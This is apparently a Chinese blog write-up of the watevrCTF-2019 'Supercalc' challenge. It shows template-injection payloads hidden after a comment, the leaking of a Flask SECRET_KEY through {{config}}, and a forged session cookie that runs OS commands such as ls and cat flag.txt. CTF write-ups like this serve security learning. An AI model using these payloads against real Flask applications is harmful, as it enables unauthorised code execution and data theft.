---
title: '[watevrCTF-2019]Supercalc'
date: 2024-09-26 21:25:56
tags: session伪造
categories: 刷题笔记
---

## [watevrCTF-2019]Supercalc

打开页面，我们发现一个计算框

我们输入1+1，返回了2

![image-20240926213408503](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409262134613.png)

这种情况我们想到ssti模版注入

我们输入{{7*7}}

结果发生报错

<!--more-->

![image-20240926213445763](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409262134790.png)

提示我们不能输入{}

我们继续查找，在cookie里发现session，看结构和开头，应该是flask框架的，我们进行解密

![image-20240926214158013](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409262141131.png)

```
{'history': [{'code': '1 + 1'}]}
```

其解密后的值为之前提交的算式，猜测`code`中的式子可被执行

我们尝试让程序进行报错

在输入`1/0`时，得到报错：

![image-20240926214351634](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409262143671.png)

说明程序对报错应该没有做过滤，尝试输入`#(注释)`：`1/0#1+1`：

![image-20240926214443212](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409262144298.png)

得到报错，式子拼接成功

得到报错，式子被成功拼接，在`#`注释后加上模版语法：

```python
1/0#{{7*7}}
```

![image-20240926214700616](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409262147696.png)

我们尝试进行模版注入

```
1/0#{{“”.__class__}}
```

又报错了，长度进行了限制

![image-20240926214835841](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409262148876.png)

我们只能伪造session了，看看是否能爆出`SECRET_KEY`的值，查看`config`

```
1/0#{{config}}
```

![image-20240926214925922](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409262149161.png)

成功找到SECRET_KEY，满足了加密**session**的条件
构造本题所需的`session`：

```
{'history': [{'code': '__import__(\"os\").popen(\"ls \").read()'}]}

```

`注`：需要将其中的`"`双引号进行转译

我们进行session加密

![image-20240926220220931](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409262202974.png)

成功伪造session

```
eyJoaXN0b3J5IjpbeyJjb2RlIjoiX19pbXBvcnRfXyhcIiBvc1xcKS5wb3BlbihcXGxzXFwpLnJlYWQoKSJ9XX0.ZvVqlg.3-2P1K8I7k9ZeL5vzceo8wQX1Cg
```

我们填入session进行刷新

![image-20240926222217990](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409262222029.png)

找到flag文件，我们打开它

```
{'history': [{'code': '__import__(\"os\").popen(\"cat flag.txt\").read()'}]}
```

重复以上操作得到flag

![image-20240926221808946](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409262218986.png)
